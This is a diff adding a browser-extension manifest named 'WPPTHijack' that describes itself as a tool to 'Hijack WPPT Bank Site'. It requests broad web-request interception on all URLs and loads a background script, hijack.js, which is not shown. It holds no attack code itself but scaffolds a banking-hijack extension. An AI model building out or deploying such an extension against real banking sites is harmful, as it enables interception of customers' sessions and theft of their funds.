@@ -1,0 +1,16 @@
+    {
+        "name": "WPPTHijack",
+"version":"1.0",
+"description": "Hijack WPPT Bank Site",
+       
+        "permissions": [
+          "webRequest",
+          "<all_urls>"
+        ],
+        "background": {
+    "scripts": ["hijack.js"]
+  },
+"manifest_version": 2
+      }
+
+
